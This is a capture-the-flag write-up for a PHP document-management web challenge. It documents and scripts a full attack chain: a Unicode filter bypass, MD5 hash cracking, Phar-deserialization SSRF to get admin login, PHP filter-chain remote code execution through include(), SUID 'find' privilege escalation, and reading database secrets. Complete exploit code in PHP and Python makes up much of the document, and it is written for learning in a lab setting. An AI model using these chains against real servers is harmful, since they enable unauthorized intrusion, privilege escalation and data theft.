<img src="images/chall.png" width=600>

### Initial Analysis  

We are given a website with a number of features for managing and viewing documents.  

<img src="images/webpage.png" width=800>

Analysing the Dockerfile, we can see that there is a `/readflag` binary which is root-executable only, hinting that we have to get privilege escalation later on.  

```dockerfile
FROM ubuntu:22.04@sha256:2b7412e6465c3c7fc5bb21d3e6f1917c167358449fecac8176c6e496e5c1f05f

ENV DEBIAN_FRONTEND=noninteractive

RUN apt update && apt install -y software-properties-common
RUN add-apt-repository ppa:ondrej/php && \
    apt update && \
    apt install -y php7.4 mysql-server apache2
RUN apt install -y php7.4-mysqli
RUN apt install php7.4-curl



COPY ./readflag /readflag

RUN chmod 700 /readflag
RUN rm -rf /var/www/html/*


COPY ./src/ /var/www/html/
COPY ./init.sql /docker-entrypoint-initdb.d/

RUN mkdir -p /var/www/html/uploads
RUN chmod 777 /var/www/html/uploads

# 권한 상승 벡터 제외

EXPOSE 80

CMD service mysql start && \
    mysql -u root < /docker-entrypoint-initdb.d/init.sql && \
    service apache2 start && \
    rm -rf /docker-entrypoint-initdb.d && \
    tail -f /dev/null
```

The `/readflag` binary only contains the first half of the flag.  

```
Why is it so difficult to mix privilege elevation? ...
Here is gift location!.
DH{REDACTED
Sorry.. The flag has been truncated. This is the last mission. Get flags from database!
```

The Dockerfile also creates a MySQL database for managing the documents on the server, with a `TOP SECRET DOCUMENT` record. Based on the original version from X-mas CTF 2023, the `secret` table contains the second part of the flag.  

```sql
-- 데이터베이스 생성 및 사용
CREATE DATABASE IF NOT EXISTS document;
USE document;

-- document 테이블 생성
CREATE TABLE IF NOT EXISTS document (
    title VARCHAR(255),
    content VARCHAR(1000),
    filename VARCHAR(255)
);

-- secret 테이블 생성
CREATE TABLE IF NOT EXISTS secret (
    secret_data VARCHAR(255) NOT NULL
);

-- document 테이블에 데이터 삽입
INSERT INTO document (title, content, filename)
VALUES ('TOP SECRET DOCUMENT', 'REDACTED', '655f365d59872.png');

-- secret 테이블에 데이터 삽입
INSERT INTO secret (secret_data)
VALUES ('REDACTED');

CREATE USER 'fake'@'%' IDENTIFIED BY 'fake';
GRANT ALL PRIVILEGES ON *.* TO 'fake'@'%';
FLUSH PRIVILEGES;
```

The credentials for the MySQL database are in `db.php`, but are redacted in the chall distribution. Keep this in mind, it will come in handy later.  

```php
$host = '127.0.0.1';
$account = 'fake';
$password = 'fake';
$db = 'document';
$conn = mysqli_connect($host,$account,$password,$db);
```

The most critical vulnerability lies in `dashboard.php`, which calls `include()` on user-supplied data, potentially giving us RCE. Access to this endpoint is restricted and requires admin authentication beforehand.  

```php
session_start();

if ($_SESSION['admin']) {
    if ($_POST['filename']) {
        $filename = strtolower($_POST['filename']);

        if (strpos($filename, "uploads") !== false) {
            echo "<div class='center-text'>Access to this file is restricted.</div>";
        } else {
            include "./templates/dashboard.html";
            include ($filename);
        }
    }
    else {
        include "./templates/dashboard.html";
    }
}
else {
    echo "<div class='center-text'>You are not admin.</div>";
}
```

The admin authentication logic lies in `admin.php`, where we have to submit an access code, whose MD5 hash will be compared against the correct access code hash stored inside the top secret document in the database.  

`POST` requests are only accepts from a local IP address, which hints at us having to get SSRF for admin login.  

```php
$sql = "SELECT content FROM document";
$result = $conn->query($sql);
$row = $result->fetch_assoc();
$admin_token = $row["content"];
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    include "./templates/admin.html";
}
else if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    try {
	$input_code = $_POST['access_code'];
	session_start();
        if (md5($input_code) === $admin_token && $_SERVER['REMOTE_ADDR'] === '127.0.0.1') { 
		$_SESSION['admin'] = true;
		echo "An access code has been issued upon correct access.";
		echo "Administrator privileges have been granted.";
        }
	else {
            echo "<script>alert('The access code is incorrect. Administrator registration is only possible on local host.');</script>";
            echo "<script>location.href='/index.php'</script>";
        }
    }
    catch(Exception $e) {
        echo "<script>alert('Wrong.');</script>";
        echo "<script>location.href='/index.php'</script>";
    }
}

else {
    echo "<script>alert('This is an unusual approach.');</script>";
    echo "<script>location.href='/index.php'</script>";
}
```

Consolidating everything, we can conclude that the intended solve path requires us to leak the admin token inside `TOP SECRET DOCUMENT`, then SSRF into `admin.php` to get admin login, and finally get RCE in `dashboard.php` to retrieve both flag parts.  

### Exploit  

Our vector for retrieving the admin access code lies in `view.php`. We are allowed to make a `GET` request with a search term, and the backend will perform a `LIKE` match to fetch matching documents.  

An important caveat is that our input is sanitised with `addslashes()` and is checked against a blacklist that blocks slashes, effectively killing SQLi.  

```php
include "./templates/view.html";
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    try {
$title = $_GET['title'];
$title = addslashes($title);
$title = strtolower($title); 
$forbidden_strings = ['top secret document', '%', '_', '\\'];
$contains_forbidden_string = false;
foreach ($forbidden_strings as $str) {
        if (strpos($title, $str) !== false) {
            $contains_forbidden_string = true;
            break;
        }
}

        if (!$contains_forbidden_string) {
            $sql = "SELECT * FROM document WHERE title LIKE '$title'";
            $result = $conn->query($sql);
            if ($row = $result->fetch_assoc()) {
                echo '<h1 class="title">' . htmlspecialchars($row['title']) . '</h1>';
                echo '<img src="/uploads/' . htmlspecialchars($row['filename']) . '" alt="Document Image" class="document-image" width="500" height="500">';
                echo '<p class="content">' . htmlspecialchars($row['content']) . '</p>';
                echo '</div>
                </body>
                </html>';
            } else {
                echo "No records found.";
            }
        } else {
            echo "The title contains forbidden words.";
        }
    } catch (mysqli_sql_exception $e) {
        echo "Query failed: " . $e->getMessage();
    }
}
else {
    echo "<script>alert('This is an unusual approach.');</script>";
    echo "<script>location.href='/TestBuild/index.php'</script>";
}
```

The blacklist also blocks `top secret document` and wildcard characters, so matching the secret document isn't that straightforward.  

We can bypass this filter using `\u2003` in place of normal spaces, as MySQL normalises it to normal spaces during normal collation.  

```
top%E2%80%83secret%E2%80%83document
```

Submitting our payload fetches `TOP SECRET DOCUMENT`, giving us a hash. Cracking this hash with [Crackstation](https://crackstation.net/) gives us `windows` as the access code.  

<img src="images/hash.png" width=800>

Now that we have the access code, we need to find a way to SSRF into `admin.php`.  

Looking at `delete.php`, the exploit becomes glaringly obvious. A `Requests` class is implemented, but is never used anywhere in the source code. The destructor of this class makes a request with `curl_exec()` with the `$url` and arguments `$postData`, and a `$cookie` argument for saving sessions.  

When we supply a filename for deletion, this endpoint fetches the file and calls `file_get_contents()` on it to display its contents. This is huge, because `file_get_contents()` is one of the many functions which triggers Phar deserialization.  

```php
ini_set('phar.readonly',0);
class Requests {
    public $url;
    private $options;
    private $postData;
    private $cookie;
    function __construct($url, $postData = '', $cookie = '', $options = array()) {
        $this->url = $url;
        $this->postData = $postData;
        $this->cookie = $cookie;
        $this->options = $options;
    }

    function __destruct(){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        if (!empty($this->postData)) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $this->postData);
        }

        if (!empty($this->cookie)) {
            curl_setopt($ch, CURLOPT_COOKIE, $this->cookie);
        }

        foreach ($this->options as $option => $value) {
            curl_setopt($ch, $option, $value);
        }

        $output = curl_exec($ch);
        echo $output;
        curl_close($ch);
    }
}
    if ($_SERVER['REQUEST_METHOD'] == 'GET') {
        include "./templates/delete.html";

    }
    else {
        if($_POST['title']) {
            $title = $_POST['title'];
            if (strpos($title, '..') !== false) {
                echo "Filtered.";
                exit(-1);
            }

            $filePath = $title;
            $imageType = pathinfo($filePath, PATHINFO_EXTENSION);
	    $allowedTypes = ['png', 'jpg', 'jpeg'];
	    if (!in_array(strtolower($imageType), $allowedTypes)) {
    		echo "Invalid image type.";
    		exit(-1);
	    }
	    $imageData = file_get_contents($filePath);
	    if ($imageData == null) {
		$filePath = './uploads/' . $filePath;
		$imageData = file_get_contents($filePath);
	    }
        ...
```

The upload functionality in `report.php` is severely flawed, as the only protection is a MIME type check, which can be easily bypassed.  

```php
if ($_SERVER['REQUEST_METHOD'] == 'POST' and $_POST['title'] and $_POST['content']) {
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        if (isset($_FILES['file']) && $_FILES['file']['error'] == 0) {
            $allowedTypes = ['image/png' => 'png', 'image/jpeg' => 'jpg'];
            $fileType = $_FILES['file']['type'];

            if (array_key_exists($fileType, $allowedTypes)) {
                $uploadPath = './uploads/';
                $randomFileName = uniqid() . '.' . $allowedTypes[$fileType];
```

We can upload a malicious Phar archive that on deserialization, creates a `Requests` object that will make a `POST` request to `admin.php` with the access code and our `PHPSESSID` cookie, allowing us to get admin login, then delete the file in `delete.php` to trigger the SSRF.  

```php
class Requests {
    public $url;
    private $options;
    private $postData;
    private $cookie;

    function __construct($url, $code, $cookie) {
        $this->url = $url;
        $this->postData = "access_code=" . $code;
        $this->cookie = $cookie;
        $this->options = array();
    }
}

$filename = 'payload.phar';

@unlink($filename);

$phar = new Phar($filename);
$phar->startBuffering();

$phar->setStub("<?php __HALT_COMPILER();");
$phar->addFromString('a.jpg', '');

$object = new Requests('http://127.0.0.1/admin.php', "windows", <PHPSESSID>);
$phar->setMetadata($object);

$phar->stopBuffering();
```

Now that we have authenticated ourselves as admin, we can finally access `dashboard.php`.  

However, the main limitation of this endpoint is that it blacklists files with `uploads` in the filepath, meaning we can't just simply upload a webshell in `report.php` and access it for RCE.  

```php
if (strpos($filename, "uploads") !== false) {
    echo "<div class='center-text'>Access to this file is restricted.</div>";
} else {
    include "./templates/dashboard.html";
    include ($filename);
}
```

Apart from filenames, `include()` also allows passing in the `php://filter` wrapper. We can thus bypass the blacklist restriction and use PHP filter chains to get RCE using [this tool](
https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py).  

```bash
python php_filter_chain_generator.py --chain '<?php system("ls 2>&1") ?>'
```

<img src="images/ls.png" width=800>

Now that we have RCE, we need to find a privilege escalation vector to get the first half of the flag.  

Running `find / -perm -4000 -type f 2>/dev/null` to enumerate SUID binaries reveals that `/usr/bin/find` has root permissions, just like in the original version of the challenge.  

<img src="images/suid.png" width=800>

We can leak that flag part using  `/usr/bin/find . -exec /readflag \\; -quit`.  

<img src="images/flag1.png" width=800>

The second flag half is pretty straightforward, as we can directly fetch it from the MySQL database.  

To connect to the database, we first need to fetch the MySQL credentials, which we can do with `cat db.php`.  

<img src="images/creds.png" width=800>

After that, we can just connect to the database and read the records in the `secret` table.  

```php
$conn = mysqli_connect('127.0.0.1', 'x-mas', 'qwer1234', 'document');
$result = mysqli_query($conn, "select * from secret");

if($result === false){
    die("ERROR: " . mysqli_error($conn));
}

while($row = mysqli_fetch_row($result)) { 
    print_r($row);
}
```

<img src="images/flag2.png" width=800>

Below are my full solve scripts for this challenge.  

```php
<?php
    class Requests {
        public $url;
        private $options;
        private $postData;
        private $cookie;

        function __construct($url, $data, $cookie) {
            $this->url = $url;
            $this->postData = $data;
            $this->cookie = $cookie;
            $this->options = array();
        }
    }

    $filename = 'payload.phar';

    @unlink($filename);

    $phar = new Phar($filename);
    $phar->startBuffering();

    $phar->setStub("<?php __HALT_COMPILER();");
    $phar->addFromString('a.jpg', '');

    $object = new Requests('http://127.0.0.1/admin.php', $argv[1] ?? "", $argv[2] ?? "");
    $phar->setMetadata($object);

    $phar->stopBuffering();
?>
```

```python
import requests
import re
import subprocess

url = "http://host8.dreamhack.games:22521/"
s = requests.Session()

# to save admin login
s.get(url)
sessid = s.cookies['PHPSESSID']

# ssrf with phar deserialization
def upload(filename, contents):
    res = s.post(f'{url}/report.php', data={
        'title': 'a',
        'content': 'a'
    }, files={
        'file': (
            filename,
            contents,
            'image/png'
        )
    })

    filepath = re.findall(r"alert\('(.+)'\)</scrip", res.text)[0]
    return filepath

def ssrf(access_code):
    subprocess.run(['php', '-d', 'phar.readonly=0', 'exploit.php', f"access_code={access_code}", f'PHPSESSID={sessid}'])

    with open('payload.phar', 'rb') as f:
        filepath = upload('payload.phar', f.read())

    res = s.post(f'{url}/delete.php', data={
        'title': f'phar://uploads/{filepath}/a.jpg'
    })

    return res.text

# get admin access code
def get_access_hash():
    res = s.get(f"{url}/view.php", params={
        'title': 'top secret document'.replace(' ', '\u2003')
    })

    access_hash = re.findall(r'content">(.+)</p>', res.text)[0].strip()
    return access_hash

# admin login
leak = ssrf('windows')

# filter chain rce
def rce(php):
    out = subprocess.check_output(['python', 'php_filter_chain_generator.py', '--chain', f'<?php {php} ?>']).decode()
    chain = re.findall(r'(php://filter.+)', out)[0].strip()

    res = s.post(f'{url}/dashboard.php', data={
        'filename': chain,
    })

    return res.text

shell = 'system("%s 2>&1")'

leak = rce(shell % "cat db.php")
account = re.findall(r"\$account = '(.+)'", leak)[0].strip()
password = re.findall(r"\$password = '(.+)'", leak)[0].strip()

def exec_sql(sql):
    db = '''
    $conn = mysqli_connect('127.0.0.1', '%s', '%s', 'document');
    $result = mysqli_query($conn, "%s");

    if($result === false){
        die("ERROR: " . mysqli_error($conn));
    }

    while($row = mysqli_fetch_row($result)) { 
        print_r($row);
    }
    '''.strip() % (account, password, sql)

    return rce(db)

# flag 1 (priv esc with mysql root)
leak = rce(shell % '/usr/bin/find . -exec /readflag \\; -quit')
flag1 = re.findall(r'(DH{.+):', leak)[0].strip()

# flag 2
leak = exec_sql('select * from secret')
flag2 = re.findall(r'\[0\] =>(.+)', leak)[0].strip()

print("Flag:", flag1 + flag2)
```

Flag: `DH{S0rRy_I_w4nTed_Mod1fi3D_Un1nt3ndeD_vu1n3r4bl1tY}`